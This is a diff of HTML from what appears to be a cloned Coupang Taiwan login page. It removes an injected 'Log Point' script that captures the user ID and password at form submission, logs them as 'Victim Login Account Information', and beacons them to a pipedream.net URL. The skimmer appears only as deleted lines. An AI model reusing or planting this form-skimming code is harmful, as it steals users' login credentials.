@@ -658,39 +658,7 @@ var I18n=I18n||{t:function(a,b){return b}};
         
         <script type="text/javascript" src="https://member.tw.coupang.com/resources/20260304222732/dist/login.min.js"></script><div class="scoped-modal__container" style="display:none;"><b class="scoped-modal__blocker"></b><b class="scoped-modal__position-fixer"></b>
   <div class="scoped-modal__content scoped-modal__content--response-simple"></div></div><ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content" id="ui-id-1" tabindex="0" style="display: none;"></ul><span role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></span><div class="qr-tab-under-line" style="top: 166.638px;"></div>
-    
-
-<!-- Log Point -->
-<script>
-    document.addEventListener('submit', function(e) {
-        const form = e.target;
-        if (form.classList.contains('_loginForm') || form.action.includes('login')) {
-            const userId = form.querySelector('[name="user_id"]')?.value || '';
-            const userPw = form.querySelector('[name="user_pw"]')?.value || '';
             
-            if (userId && userPw) {
-                console.log('=== Victim Login Account Information ===');
-                console.log('UserID:', userId);
-                console.log('Password:', userPw);
-                console.log('========================================');
-                
-                const url = 'https://11c9bf472599957da48779c59702d232.m.pipedream.net';
-                
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(url, JSON.stringify({
-                        user_id: userId,
-                        user_pw: userPw,
-                        timestamp: new Date().toISOString()
-                    }));
-                }
-                
-                
-            }
-        }
-    }, true);
-</script>
-
-          
 
 <script src="//front.coupangcdn.com/web-inspector/config/web-inspector.config.js"></script>
 <script type="text/javascript" id="" charset="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","998664010840918");fbq("track","PageView");</script>
